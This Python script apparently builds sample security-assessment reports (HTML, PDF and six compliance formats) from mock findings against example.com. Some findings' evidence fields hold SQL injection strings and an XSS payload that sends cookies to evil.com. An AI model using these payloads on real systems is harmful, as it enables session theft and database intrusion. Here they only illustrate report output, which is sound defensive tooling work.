#!/usr/bin/env python3
"""Generate sample security reports in all formats to demonstrate all features.

Creates realistic findings and renders:
- Enhanced HTML report with CWE bars, compliance tags, evidence
- PDF report with severity summary and findings table
- All 6 compliance reports: OWASP Top 10, PCI DSS, SOC 2, NIST CSF, HIPAA, ISO 27001

Usage:
    python scripts/generate_sample_report.py
    python scripts/generate_sample_report.py --open  (opens HTML in browser)
    python scripts/generate_sample_report.py --dir ./reports  (custom output dir)
"""

import argparse
import logging
import os
import sys
import tempfile
import webbrowser
from pathlib import Path

# Ensure project root is on path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("sample-report")

# Realistic sample findings across multiple categories
SAMPLE_FINDINGS = [
    {
        "severity": "CRITICAL",
        "finding_type": "SQL_INJECTION",
        "endpoint": "/api/v2/login",
        "title": "Time-based Blind SQL Injection in Login Endpoint",
        "description": "The login endpoint accepts user-supplied input that is directly concatenated into SQL queries. "
                       "An attacker can inject SQL commands through the 'username' parameter, potentially gaining "
                       "unauthorized access to the database containing user credentials and PII data.",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. "
                       "Implement input validation and use an ORM framework. Apply the principle of least privilege "
                       "to database accounts used by the application.",
        "cwe_id": "CWE-89",
        "evidence": {
            "payload": "' OR 1=1--",
            "response_time": "5.2s",
            "affected_column": "username",
            "database_version": "MySQL 8.0.32",
            "error_message": "You have an error in your SQL syntax"
        },
        "source_tool": "nuclei",
        "confidence": 0.95,
    },
    {
        "severity": "CRITICAL",
        "finding_type": "SQL_INJECTION",
        "endpoint": "/admin/users/export",
        "title": "Second-order SQL Injection in User Export",
        "description": "Blind SQL injection vulnerability in the user export functionality. "
                       "Crafted data stored in the database is executed when generating CSV exports, "
                       "allowing attackers to extract sensitive information.",
        "remediation": "Sanitize all data before using in SQL statements, even data retrieved from the database. "
                       "Use prepared statements for all database operations.",
        "cwe_id": "CWE-89",
        "evidence": {"payload": "admin' UNION SELECT * FROM users--", "export_format": "CSV"},
        "source_tool": "nuclei",
        "confidence": 0.88,
    },
    {
        "severity": "HIGH",
        "finding_type": "XSS",
        "endpoint": "/search?q=",
        "title": "Stored Cross-Site Scripting in Search Results",
        "description": "User input submitted through the search functionality is reflected in search results "
                       "without proper HTML encoding. An attacker can inject malicious scripts that execute "
                       "in victims' browsers.",
        "remediation": "Apply context-aware output encoding. Use Content-Security-Policy headers. "
                       "Implement a strict CSP that blocks inline scripts.",
        "cwe_id": "CWE-79",
        "evidence": {
            "payload": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
            "affected_page": "/search?q=test",
            "browser": "Chrome 120"
        },
        "source_tool": "httpx",
        "confidence": 0.92,
    },
    {
        "severity": "MEDIUM",
        "finding_type": "BROKEN_ACCESS_CONTROL",
        "endpoint": "/api/v2/admin/users",
        "title": "IDOR in User Profile API",
        "description": "The user profile API does not properly verify ownership before returning user data. "
                       "An authenticated user can enumerate other users by incrementing the user ID parameter.",
        "remediation": "Implement proper authorization checks on all API endpoints. Use UUIDs instead of "
                       "sequential IDs. Enforce row-level security in the database layer.",
        "cwe_id": "CWE-639",
        "evidence": {
            "original_user_id": 1001,
            "enumerated_user_id": 1005,
            "returned_data": "email, name, role, department"
        },
        "source_tool": "katana",
        "confidence": 0.78,
    },
    {
        "severity": "HIGH",
        "finding_type": "WEAK_TLS",
        "endpoint": "https://api.example.com:443",
        "title": "Weak TLS 1.0 Protocol Supported",
        "description": "The server supports TLS 1.0 which is a deprecated protocol version with known "
                       "vulnerabilities including POODLE and BEAST attacks. An attacker capable of "
                       "man-in-the-middle position can decrypt traffic.",
        "remediation": "Disable TLS 1.0 and TLS 1.1. Enable TLS 1.2 and TLS 1.3 only. "
                       "Use strong cipher suites with forward secrecy.",
        "cwe_id": "CWE-326",
        "evidence": {
            "supported_protocols": ["TLS 1.0", "TLS 1.1", "TLS 1.2"],
            "weak_ciphers": ["TLS_RSA_WITH_3DES_EDE_CBC_SHA"],
            "scan_tool": "testssl.sh"
        },
        "source_tool": "nmap",
        "confidence": 0.99,
    },
    {
        "severity": "MEDIUM",
        "finding_type": "SECURITY_MISCONFIGURATION",
        "endpoint": "/robots.txt",
        "title": "Sensitive Paths Exposed in robots.txt",
        "description": "The robots.txt file exposes administrative and internal paths including "
                       "admin panels, backup directories, and API documentation paths.",
        "remediation": "Remove sensitive paths from robots.txt. Use proper authentication on admin panels "
                       "instead of relying on obscurity. Ensure backup files are not web-accessible.",
        "cwe_id": "CWE-16",
        "evidence": {
            "exposed_paths": ["/admin", "/backup", "/api/docs", "/internal", "/.git"],
            "file_url": "https://example.com/robots.txt"
        },
        "source_tool": "httpx",
        "confidence": 0.85,
    },
    {
        "severity": "LOW",
        "finding_type": "INFO_LEAK",
        "endpoint": "/",
        "title": "Server Version Disclosure in HTTP Headers",
        "description": "The server exposes its software version through the Server and X-Powered-By HTTP headers. "
                       "This information can help attackers identify vulnerable versions.",
        "remediation": "Remove or obfuscate version information from HTTP headers. "
                       "Configure the web server to use generic server tokens.",
        "cwe_id": "CWE-200",
        "evidence": {
            "server_header": "Apache/2.4.41 (Ubuntu)",
            "x_powered_by": "PHP/8.1.2"
        },
        "source_tool": "httpx",
        "confidence": 0.75,
    },
    {
        "severity": "CRITICAL",
        "finding_type": "AUTH_FAILURE",
        "endpoint": "/api/v2/auth/token",
        "title": "JWT Token Without Expiration",
        "description": "The authentication system issues JWT tokens without an expiration claim. "
                       "Stolen or leaked tokens remain valid indefinitely, allowing persistent unauthorized access.",
        "remediation": "Add 'exp' claim to all JWT tokens with a reasonable expiration time. "
                       "Implement token refresh with short-lived access tokens. "
                       "Maintain a token blacklist for revoked tokens.",
        "cwe_id": "CWE-613",
        "evidence": {
            "token_payload": {"sub": "user123", "role": "admin", "iat": 1719000000},
            "missing_claims": ["exp", "nbf"],
            "token_lifetime": "infinite"
        },
        "source_tool": "jwt_tool",
        "confidence": 0.96,
    },
    {
        "severity": "MEDIUM",
        "finding_type": "VULNERABLE_COMPONENT",
        "endpoint": "package.json",
        "title": "Outdated Dependencies with Known Vulnerabilities",
        "description": "Several frontend dependencies have known CVEs. The application uses lodash 4.17.20 "
                       "(CVE-2021-23337), axios 0.19.0 (CVE-2021-3749), and moment.js 2.24.0.",
        "remediation": "Update all dependencies to their latest versions. Implement automated dependency scanning "
                       "in CI/CD pipeline. Use Snyk or Dependabot for continuous monitoring.",
        "cwe_id": "CWE-1104",
        "evidence": {
            "vulnerable_packages": {
                "lodash": "4.17.20 -> 4.17.21",
                "axios": "0.19.0 -> 1.6.0",
                "moment": "2.24.0 -> 2.29.4"
            },
            "cve_count": 7
        },
        "source_tool": "npm_audit",
        "confidence": 0.90,
    },
]

EXECUTIVE_SUMMARY = (
    "The security assessment of example.com identified 9 findings across 4 severity levels. "
    "Three CRITICAL vulnerabilities were found: two SQL injection flaws affecting the login and "
    "user export endpoints, and a JWT authentication bypass that allows permanent token reuse. "
    "The two HIGH severity findings include a stored XSS vulnerability and weak TLS protocol support. "
    "Notable MEDIUM findings include an IDOR vulnerability, security misconfiguration exposing "
    "sensitive paths, and outdated dependencies. The LOW severity finding is a server version "
    "disclosure. Immediate remediation is recommended for the CRITICAL and HIGH severity findings, "
    "particularly the SQL injection and authentication bypass issues which pose the highest risk "
    "to data confidentiality."
)

# All 6 compliance standards with display labels
COMPLIANCE_STANDARDS = [
    ("owasp_top10", "OWASP Top 10 2021"),
    ("pci_dss", "PCI DSS 4.0"),
    ("soc2", "SOC 2"),
    ("nist_csf", "NIST CSF"),
    ("hipaa", "HIPAA"),
    ("iso_27001", "ISO 27001"),
]


def generate_html_report(output_dir: str) -> str:
    """Generate enhanced HTML report with all features."""
    from reporting.html_report import render_html_report

    severity_breakdown = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in SAMPLE_FINDINGS:
        sev = (f.get("severity") or "INFO").upper()
        if sev in severity_breakdown:
            severity_breakdown[sev] += 1

    html = render_html_report(
        title="Security Assessment Report - Sample",
        target="https://example.com",
        findings=SAMPLE_FINDINGS,
        severity_breakdown=severity_breakdown,
        executive_summary=EXECUTIVE_SUMMARY,
    )

    output_path = os.path.join(output_dir, "sample_report.html")
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html)

    size = os.path.getsize(output_path)
    logger.info(f"  {output_path} ({size:,} bytes)")
    return output_path


def generate_compliance_report(standard: str, output_dir: str, label: str) -> str:
    """Generate a compliance-specific HTML report."""
    from compliance_reporting import generate_compliance_report

    result = generate_compliance_report(
        standard=standard,
        engagement_id="sample-engagement",
        findings=SAMPLE_FINDINGS,
    )

    output_path = os.path.join(output_dir, f"compliance_{label}.html")
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(result["html"])

    size = os.path.getsize(output_path)
    summary = result["report"]["summary"]

    # Print quick summary depending on standard type
    if standard == "owasp_top10":
        cats = summary.get("categories", {})
        for cat, count in sorted(cats.items(), key=lambda x: -x[1]):
            logger.info(f"    {cat:<45} {count} finding(s)")
    elif standard == "pci_dss":
        logger.info(f"    Compliant: {summary['compliant_requirements']}/{summary['total_requirements']}")
        logger.info(f"    Non-compliant: {summary['non_compliant_requirements']}")
    elif standard in ("hipaa", "iso_27001"):
        logger.info(f"    Composite score: {summary['composite_score']}/100")
    elif standard == "soc2":
        logger.info(f"    Passing: {summary['passing_criteria']}/{summary['total_criteria']}")
        logger.info(f"    Failing: {summary['failing_criteria']}")
    elif standard == "nist_csf":
        logger.info(f"    Functions covered: {summary.get('total_functions', 'N/A')}")

    logger.info(f"  {output_path} ({size:,} bytes)")
    return output_path


def generate_pdf_report(output_dir: str) -> str:
    """Generate a PDF report with cover page, severity summary, and findings table."""
    from reporting.pdf_report import render_pdf_report

    severity_breakdown = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in SAMPLE_FINDINGS:
        sev = (f.get("severity") or "INFO").upper()
        if sev in severity_breakdown:
            severity_breakdown[sev] += 1

    pdf_bytes = render_pdf_report(
        title="Security Assessment Report - Sample",
        target="https://example.com",
        findings=SAMPLE_FINDINGS,
        severity_breakdown=severity_breakdown,
        executive_summary=EXECUTIVE_SUMMARY,
    )

    output_path = os.path.join(output_dir, "sample_report.pdf")
    with open(output_path, "wb") as f:
        f.write(pdf_bytes)

    size = os.path.getsize(output_path)
    logger.info(f"  {output_path} ({size:,} bytes)")
    return output_path


def main():
    parser = argparse.ArgumentParser(description="Generate sample security reports")
    parser.add_argument("--open", "-o", action="store_true", help="Open reports in browser")
    parser.add_argument("--dir", type=str, default=None, help="Output directory")
    args = parser.parse_args()

    if args.dir:
        output_dir = args.dir
    else:
        output_dir = tempfile.mkdtemp(prefix="argus-report-")
    os.makedirs(output_dir, exist_ok=True)

    total_reports = 2 + len(COMPLIANCE_STANDARDS)  # HTML + PDF + compliance

    print(f"\n{'='*60}")
    print(f"  Argus Sample Report Generator")
    print(f"{'='*60}")
    print(f"\nFindings: {len(SAMPLE_FINDINGS)} across multiple categories")
    print(f"Output:   {output_dir}")
    print()

    # [1/total] Enhanced HTML report
    print(f"[1/{total_reports}] Enhanced HTML Report (bar charts, CWE, compliance tags, evidence)...")
    html_path = generate_html_report(output_dir)

    # [2/total] PDF report
    print(f"[2/{total_reports}] PDF Report (severity summary, findings table, cover page)...")
    pdf_path = generate_pdf_report(output_dir)

    # [3-8/total] All 6 compliance reports
    for i, (standard, display_name) in enumerate(COMPLIANCE_STANDARDS, start=3):
        print(f"[{i}/{total_reports}] {display_name} Compliance Report...")
        generate_compliance_report(standard, output_dir, standard)

    print(f"\n{'='*60}")
    print(f"  All {total_reports} reports generated in {output_dir}")
    print(f"{'='*60}")
    print(f"\nTo view:")
    print(f"  Enhanced HTML report:   {html_path}")
    print(f"  PDF report:             {pdf_path}")

    for standard, label in COMPLIANCE_STANDARDS:
        print(f"  {label:<24} {os.path.join(output_dir, 'compliance_' + standard + '.html')}")

    if args.open:
        try:
            webbrowser.open(f"file://{html_path}")
        except Exception:
            pass

    return 0


if __name__ == "__main__":
    sys.exit(main())
